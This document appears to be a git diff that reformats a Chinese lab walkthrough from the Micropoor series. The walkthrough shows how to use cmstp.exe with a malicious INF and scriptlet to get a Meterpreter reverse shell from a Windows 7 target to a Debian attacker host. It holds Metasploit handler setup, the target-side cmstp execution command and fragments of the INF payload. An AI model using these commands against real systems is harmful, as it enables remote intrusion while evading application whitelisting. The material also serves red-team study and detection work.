@@ -1,30 +1,31 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，可预防**肾结石，通风**等。
 痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。
 
-**Cmstp简介：**
+### Cmstp简介：
 
 Cmstp安装或删除“连接管理器”服务配置文件。如果不含可选参数的情况下使用，则 cmstp 会使用对应于操作系统和用户的权限的默认设置来安装服务配置文件。
 
-微软官方文档：
+微软官方文档：  
 https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp
 
 **说明：**Cmstp.exe所在路径已被系统添加PATH环境变量中，因此，Cmstp命令可识别，需注意x86，x64位的Cmstp调用。
 
 Windows 2003 默认位置：
-`C:\Windows\System32\cmstp.exe
-C:\Windows\SysWOW64\cmstp.exe`
+```bash
+C:\Windows\System32\cmstp.exe
+C:\Windows\SysWOW64\cmstp.exe
+```
 
 Windows 7 默认位置：
-`C:\Windows\System32\cmstp.exe
-C:\Windows\SysWOW64\cmstp.exe`
+```bash
+C:\Windows\System32\cmstp.exe
+C:\Windows\SysWOW64\cmstp.exe
+```
 
-**攻击机：** 192.168.1.4 Debian
-**靶机：** 192.168.1.119 Windows 7
+**攻击机：** 192.168.1.4 Debian  
+**靶机：** 192.168.1.119 Windows 7  
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 **注：x64 payload**
 ```bash
 msf exploit(multi/handler) > show options 
@@ -56,11 +57,13 @@ emsf exploit(multi/handler) > exploit
 ```
 > ![](media/ee35110fac6445ca003afa5930687f9b.jpg)
 
-**靶机执行：**
-`cmstp.exe /ni /s C:\Users\John\Desktop\rev.inf`
+### 靶机执行：
+```bash
+cmstp.exe /ni /s C:\Users\John\Desktop\rev.inf
+```
 ![](media/f8ba68b01cc57ff5bf2e5a592f680561.jpg)
 
-**注：x64 payload**
+### 注：x64 payload
 ```bash
 msf exploit(multi/handler) > exploit 
 
@@ -83,10 +86,10 @@ meterpreter >
 ```
 ![](media/81f60ffe54cd72a80fd46bb154ef5e83.jpg)
 
-## 附录：
+### 附录：
 
 **Micropoor_rev_cmstp_inf：**
-```
+```inf
 [version]
  
 Signature=$chicago$
@@ -261,4 +264,5 @@ debug(e.message);
 </registration>
 </scriptlet> 
 ```
+
 >   Micropoor
